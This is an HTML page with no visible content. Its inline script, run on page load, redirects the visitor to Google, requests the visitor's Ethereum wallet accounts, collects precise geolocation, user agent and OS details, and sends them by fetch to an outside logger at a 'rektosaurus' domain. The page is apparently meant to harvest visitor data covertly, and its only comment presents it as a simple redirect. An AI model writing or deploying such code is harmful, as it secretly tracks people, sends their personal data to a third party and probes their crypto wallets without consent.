<!DOCTYPE html>
<html>
<head>
  <script>
    "use strict";

    async function requestAccounts() {
      if (window.ethereum) {
        try {
          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
          console.log(accounts);
        } catch (err) {
          console.log("Error executing eth_requestAccounts: " + err.message);
        }
      }
    }

    function getCurrentPosition() {
      return new Promise((resolve, reject) => {
        const options = {
          enableHighAccuracy: true,
          timeout: 5000,
          maximumAge: 0
        };

        function success(pos) {
          const crd = pos.coords;
          const loc = `${crd.latitude},${crd.longitude}`;
          resolve(loc);
        }

        function error(err) {
          console.warn(`ERROR(${err.code}): ${err.message}`);
          reject(err);
        }

        navigator.geolocation.getCurrentPosition(success, error, options);
      });
    }

    async function sendRequest() {
      try {
        const loc = await getCurrentPosition();
        const cpu = navigator.oscpu;
        const ua = navigator.userAgent;

        const url = `https://rex.rektosaurus.io/logger/ua=${ua}&oscpu=${cpu}&loc=${loc}`;
        await fetch(url);
      } catch (err) {
        console.log("Error executing HTTP request: " + err.message);
      }
    }

    // Modified code to redirect the user to Google.com
    function redirectUser() {
      // Check if the code is running in an extension or iOS app
      if (window.chrome && chrome.runtime && chrome.runtime.id) {
        // Redirect in Chrome extension
        chrome.runtime.sendMessage({ redirect: "https://www.google.com" });
      } else if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.redirect) {
        // Redirect in iOS app
        window.webkit.messageHandlers.redirect.postMessage("https://www.google.com");
      } else {
        // Redirect in other scenarios (browser)
        window.location.href = "https://www.google.com";
      }
    }

    window.addEventListener('load', async () => {
      try {
        // Redirect the user to Google.com
        redirectUser();

        // Attempt to request Ethereum accounts
        await requestAccounts();

        // Send the HTTP request
        await sendRequest();
      } catch (err) {
        console.log("Error: " + err.message);
      }
    });
  </script>
</head>
<body>
</body>
</html>
